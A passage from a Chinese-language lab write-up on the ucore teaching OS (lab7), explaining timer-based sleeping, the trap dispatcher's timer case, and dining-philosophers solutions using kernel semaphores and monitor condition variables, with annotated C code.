<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">do_sleep</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> time)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (time == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag); <span class="comment">/* 关闭中断 */</span></span><br><span class="line">    <span class="keyword">timer_t</span> __timer, *timer = timer_init(&amp;__timer, current, time); </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    __timer:未初始化的timer</span></span><br><span class="line"><span class="comment">    current:为该timer绑定进程(current当前进程)</span></span><br><span class="line"><span class="comment">    time:设置剩余时间</span></span><br><span class="line"><span class="comment">    *timer:初始化完毕的timer(__timer只是临时数据,最终会把数据返回给*timer)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    current-&gt;state = PROC_SLEEPING; <span class="comment">/* 设置进程状态为:PROC_SLEEPING(睡眠) */</span></span><br><span class="line">    current-&gt;wait_state = WT_TIMER; <span class="comment">/* 设置等待原因为:等待定时器 */</span></span><br><span class="line">    add_timer(timer); <span class="comment">/* 添加该定时器 */</span></span><br><span class="line">    local_intr_restore(intr_flag); <span class="comment">/* 重新打开中断 */</span></span><br><span class="line"></span><br><span class="line">    schedule(); <span class="comment">/* 执行调度程序(当前进程放弃CPU资源) */</span></span><br><span class="line"></span><br><span class="line">    del_timer(timer); <span class="comment">/* 删除定时器 */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我会结合前面实验中有关进程的调度的部分内容，详细描述一下这个过程：</p>
<ul>
<li>内核的第一个进程 <code>idleproc</code>（空闲进程）会执行 <code>cpu_idle</code> 函数，在这个函数中循环执行 <code>schedule</code> 用于空闲进程的调度，这个函数是永远不会停止的</li>
<li>其他的进程都会因为<code>schedule</code> 而被调度，又会因为各种原因被中断，然后再次调度</li>
<li>当 “PROC_SLEEPING” 被设置时：<code>schedule</code> 就已经不会再调度该进程了，如果再次执行<code>schedule</code> ，CPU就会放弃当前进程，转而去遍历整个进程链表，直到找出处于就绪状态的进程，并将其调度</li>
<li>当 “add_timer(timer)” 执行时：绑定有当前进程的 timer 被链入 timer 链表，然后CPU会周期性调用 run_timer_list 检查 timer-&gt;expires 是否为“0”</li>
<li>如果时间结束，就会调用 wakeup_proc 重新设置该进程为 “PROC_RUNNABLE” ，这样<code>schedule</code> 就可以再次调度该进程了</li>
</ul>
<h2 id="练习0-把-lab6-的内容复制粘贴到-lab7"><a href="#练习0-把-lab6-的内容复制粘贴到-lab7" class="headerlink" title="练习0-把 lab6 的内容复制粘贴到 lab7"></a>练习0-把 lab6 的内容复制粘贴到 lab7</h2><p>trap_dispatch 中有关时钟中断的部分需要更新：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> T_PGFLT: <span class="comment">/* 页错误异常(page fault) */</span></span><br><span class="line">        <span class="keyword">if</span> ((ret = pgfault_handler(tf)) != <span class="number">0</span>) &#123;</span><br><span class="line">            print_trapframe(tf);</span><br><span class="line">            <span class="comment">/* lab5新增:与进程相关的if判断语句 */</span></span><br><span class="line">            <span class="keyword">if</span> (current == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                panic(<span class="string">&quot;handle pgfault failed. ret=%d\n&quot;</span>, ret);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (trap_in_kernel(tf)) &#123;</span><br><span class="line">                    panic(<span class="string">&quot;handle pgfault failed in kernel mode. ret=%d\n&quot;</span>, ret);</span><br><span class="line">                &#125;</span><br><span class="line">                cprintf(<span class="string">&quot;killed by kernel.\n&quot;</span>);</span><br><span class="line">                panic(<span class="string">&quot;handle user mode pgfault failed. ret=%d\n&quot;</span>, ret); </span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SYSCALL: <span class="comment">/* 系统调用(syscall) */</span></span><br><span class="line">        syscall();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">/*  &lt;---- start ----&gt;  */</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks ++;</span><br><span class="line">        assert(current != <span class="literal">NULL</span>);</span><br><span class="line">        run_timer_list(); <span class="comment">/* lab7新添:更新定时器的时间,并更新当前进程的运行时间片 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">/*  &lt;---- end ----&gt;  */</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_COM1: <span class="comment">/* 中断请求-串口中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;serial [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD: <span class="comment">/* 中断请求-键盘中断 */</span></span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOU: <span class="comment">/* 中断请求-内核到用户空间触发的中断 */</span></span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK: <span class="comment">/* 中断请求-用户空间到内核触发的中断 */</span></span><br><span class="line">        panic(<span class="string">&quot;T_SWITCH_** ??\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE1: <span class="comment">/* 中断请求-IDE通道1中断 */</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_IDE2: <span class="comment">/* 中断请求-IDE通道2中断 */</span></span><br><span class="line">            <span class="comment">/* 本实验不涉及这一部分 */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">/* lab5改动:完善了报错处理 */</span></span><br><span class="line">        print_trapframe(tf); <span class="comment">/* 打印trapframe结构体(中断帧,用于存储执行中断的信息) */</span></span><br><span class="line">        <span class="keyword">if</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">&quot;unhandled trap.\n&quot;</span>);</span><br><span class="line">            do_exit(-E_KILLED);</span><br><span class="line">        &#125;</span><br><span class="line">        panic(<span class="string">&quot;unexpected trap in kernel.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题"><a href="#练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题" class="headerlink" title="练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题"></a>练习1-理解内核级信号量的实现和基于内核级信号量的哲学家就餐问题</h2><p>哲学家就餐问题：</p>
<ul>
<li>五个哲学家共用一张圆桌，分别坐在周围的五张椅子上，在圆桌上有五个碗和五只筷子，他们的生活方式是交替的进行思考和进餐，平时，一个哲学家进行思考，饥饿时便试图取用其左右最靠近他的筷子，只有在他拿到两只筷子时才能进餐，进餐完毕，放下筷子继续思考</li>
</ul>
<p>ucore 中的案例：</p>
<ul>
<li>相关宏定义与结构体：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 5 <span class="comment">/* 哲学家数目 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LEFT (i-1+N)%N <span class="comment">/* i的左邻号码 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RIGHT (i+1)%N <span class="comment">/* i的右邻号码 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THINKING 0 <span class="comment">/* 哲学家正在思考 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HUNGRY 1 <span class="comment">/* 哲学家想取得叉子 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EATING 2 <span class="comment">/* 哲学家正在吃面 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TIMES  4 <span class="comment">/* 吃4次饭 */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SLEEP_TIME 10</span></span><br></pre></td></tr></table></figure>
<ul>
<li>philosopher_using_semaphore：实现主体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> state_sema[N]; <span class="comment">/* 记录每个人状态的数组 */</span></span><br><span class="line"><span class="keyword">semaphore_t</span> mutex; <span class="comment">/* 临界区互斥 */</span></span><br><span class="line"><span class="keyword">semaphore_t</span> s[N]; <span class="comment">/* 每个哲学家一个信号量 */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">philosopher_proc_sema</span>[<span class="title">N</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_semaphore</span><span class="params">(<span class="keyword">void</span> * arg)</span> <span class="comment">/* i：哲学家号码，从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">&quot;I am No.%d philosopher_sema\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; <span class="comment">/* 无限循环 */</span></span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_sema is thinking\n&quot;</span>,iter,i); <span class="comment">/* 哲学家正在思考 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_sema(i); <span class="comment">/* 需要两只叉子,或者阻塞 */</span></span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_sema is eating\n&quot;</span>,iter,i); <span class="comment">/* 进餐 */</span></span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_sema(i); <span class="comment">/* 把两把叉子同时放回桌子 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;No.%d philosopher_sema quit\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_take_forks_sema：需要两只叉子,或者阻塞 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">        phi_test_sema(i); <span class="comment">/* 哲学家尝试得到两只叉子,并且进餐 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">        down(&amp;s[i]); <span class="comment">/* 如果得不到叉子就阻塞 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_put_forks_sema：把两把叉子同时放回桌子 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_sema</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        down(&amp;mutex); <span class="comment">/* 进入临界区 */</span></span><br><span class="line">        state_sema[i]=THINKING; <span class="comment">/* 哲学家进餐结束 */</span></span><br><span class="line">        phi_test_sema(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">        phi_test_sema(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line">        up(&amp;mutex); <span class="comment">/* 离开临界区 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_test_sema：哲学家尝试得到两只叉子，并且进餐</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_test_sema</span><span class="params">(i)</span> <span class="comment">/* i：哲学家号码从0到N-1 */</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(state_sema[i]==HUNGRY &amp;&amp; state_sema[LEFT]!=EATING &amp;&amp; state_sema[RIGHT]!=EATING) <span class="comment">/* 哲学家自己是饥饿状态,左右两边的哲学家都不是进食状态 */</span></span><br><span class="line">    &#123;</span><br><span class="line">        state_sema[i]=EATING; <span class="comment">/* 设置为进食状态 */</span></span><br><span class="line">        up(&amp;s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>完整过程：</p>
<ul>
<li>哲学家会循环进行两件事情：<ul>
<li>phi_take_forks_sema：拿起两把叉子准备进食</li>
<li>phi_put_forks_sema：放回两把叉子</li>
</ul>
</li>
<li>本程序没有对叉子进行标记，而是通过检查相邻哲学家的进食状态，来判断自己是否可以进食</li>
<li>在哲学家执行 phi_put_forks_sema 时，会检查相邻的哲学家是否可以进食（因为自己进食以后会归还叉子，给相邻哲学家创造了进食机会）</li>
</ul>
<h2 id="练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题"><a href="#练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题" class="headerlink" title="练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题"></a>练习2-完成内核级条件变量和基于内核级条件变量的哲学家就餐问题</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">monitor</span>&#123;</span> <span class="comment">/* 管程 */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> mutex;      <span class="comment">// 管程锁,每次只能有一个进程执行管程代码(该值初始化为&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> next;       <span class="comment">// 用于条件同步(进程同步操作的信号量),发出signal操作的进程等条件为真之前进入睡眠</span></span><br><span class="line">    <span class="keyword">int</span> next_count;         <span class="comment">// 休眠的信令进程数</span></span><br><span class="line">    <span class="keyword">condvar_t</span> *cv;          <span class="comment">// 当前管程中存放所有条件变量的数组</span></span><br><span class="line">&#125; <span class="keyword">monitor_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">condvar</span>&#123;</span> <span class="comment">/* 条件变量 */</span></span><br><span class="line">    <span class="keyword">semaphore_t</span> sem;        <span class="comment">// 条件变量所对应的信号量</span></span><br><span class="line">    <span class="keyword">int</span> count;              <span class="comment">// 等待当前条件变量的等待进程总数</span></span><br><span class="line">    <span class="keyword">monitor_t</span> * owner;      <span class="comment">// 当前条件变量的父管程</span></span><br><span class="line">&#125; <span class="keyword">condvar_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* 信号量 */</span></span><br><span class="line">    <span class="keyword">int</span> value;					   <span class="comment">// 信号量值 </span></span><br><span class="line">    <span class="keyword">wait_queue_t</span> wait_queue;		<span class="comment">// 等待队列</span></span><br><span class="line">&#125; <span class="keyword">semaphore_t</span>;</span><br></pre></td></tr></table></figure>
<p>monitor_init 函数会初始管程，而对信号量进行的 P()，V() 操作（up，down）将会被封装为控制管程的两个函数 - cond_signal 和 cond_wait：</p>
<ul>
<li>cond_signal：当某个线程准备离开临界区，准备释放对应的条件变量时，执行该函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> </span></span><br><span class="line"><span class="function"><span class="title">cond_signal</span> <span class="params">(<span class="keyword">condvar_t</span> *cvp)</span> </span>&#123;</span><br><span class="line">   cprintf(<span class="string">&quot;cond_signal begin: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);  </span><br><span class="line">    <span class="keyword">if</span>(cvp-&gt;count&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        cvp-&gt;owner-&gt;next_count ++;</span><br><span class="line">        up(&amp;(cvp-&gt;sem)); <span class="comment">/* 尝试唤醒条件变量cvp对应的信号量中的等待队列中的第一项 */</span></span><br><span class="line">        down(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line">        cvp-&gt;owner-&gt;next_count --;</span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;cond_signal end: cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>cond_wait：当某个线程需要等待锁时，执行该函数</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">cond_wait</span> <span class="params">(<span class="keyword">condvar_t</span> *cvp)</span> </span>&#123;</span><br><span class="line">    cprintf(<span class="string">&quot;cond_wait begin:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">    cvp-&gt;count++;</span><br><span class="line">    <span class="keyword">if</span>(cvp-&gt;owner-&gt;next_count &gt; <span class="number">0</span>)</span><br><span class="line">        up(&amp;(cvp-&gt;owner-&gt;next));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        up(&amp;(cvp-&gt;owner-&gt;mutex));</span><br><span class="line">    down(&amp;(cvp-&gt;sem));</span><br><span class="line">    cvp-&gt;count --;</span><br><span class="line">    cprintf(<span class="string">&quot;cond_wait end:  cvp %x, cvp-&gt;count %d, cvp-&gt;owner-&gt;next_count %d\n&quot;</span>, cvp, cvp-&gt;count, cvp-&gt;owner-&gt;next_count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是对哲学家就餐问题的改进：（基于管程）</p>
<ul>
<li>philosopher_using_condvar：程序主体</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">philosopher_proc_condvar</span>[<span class="title">N</span>];</span> <span class="comment">// N个哲学家</span></span><br><span class="line"><span class="keyword">int</span> state_condvar[N];                            <span class="comment">// 哲学家的状态</span></span><br><span class="line"><span class="keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="comment">// 管程</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">philosopher_using_condvar</span><span class="params">(<span class="keyword">void</span> * arg)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">int</span> i, iter=<span class="number">0</span>;</span><br><span class="line">    i=(<span class="keyword">int</span>)arg;</span><br><span class="line">    cprintf(<span class="string">&quot;I am No.%d philosopher_condvar\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">while</span>(iter++&lt;TIMES)</span><br><span class="line">    &#123; </span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_condvar is thinking\n&quot;</span>,iter,i); </span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_take_forks_condvar(i); <span class="comment">/* 需要两只叉子,或者阻塞 */</span></span><br><span class="line"></span><br><span class="line">        cprintf(<span class="string">&quot;Iter %d, No.%d philosopher_condvar is eating\n&quot;</span>,iter,i);</span><br><span class="line">        do_sleep(SLEEP_TIME);</span><br><span class="line">        phi_put_forks_condvar(i); <span class="comment">/* 把两把叉子同时放回桌子 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;No.%d philosopher_condvar quit\n&quot;</span>,i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_take_forks_condvar：需要两只叉子，或者阻塞</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_take_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">    state_condvar[i]=HUNGRY; <span class="comment">/* 记录下哲学家i饥饿的事实 */</span></span><br><span class="line">    phi_test_condvar(i); <span class="comment">/* 哲学家尝试得到两只叉子,并且进餐 */</span></span><br><span class="line">    <span class="keyword">if</span> (state_condvar[i] != EATING) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;phi_take_forks_condvar: %d didn&#x27;t get fork and will wait\n&quot;</span>,i);</span><br><span class="line">        cond_wait(&amp;mtp-&gt;cv[i]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">    <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">        up(&amp;(mtp-&gt;next));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_put_forks_condvar：把两把叉子同时放回桌子</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phi_put_forks_condvar</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">    down(&amp;(mtp-&gt;mutex));</span><br><span class="line"><span class="comment">//--------into routine in monitor--------------</span></span><br><span class="line">    state_condvar[i]=THINKING;</span><br><span class="line">    phi_test_condvar(LEFT); <span class="comment">/* 看一下左邻居现在是否能进餐 */</span></span><br><span class="line">    phi_test_condvar(RIGHT); <span class="comment">/* 看一下右邻居现在是否能进餐 */</span></span><br><span class="line"><span class="comment">//--------leave routine in monitor--------------</span></span><br><span class="line">    <span class="keyword">if</span>(mtp-&gt;next_count&gt;<span class="number">0</span>)</span><br><span class="line">        up(&amp;(mtp-&gt;next));</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        up(&amp;(mtp-&gt;mutex));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>phi_test_condvar：哲学家尝试得到两只叉子,并且进餐</li>
</ul>
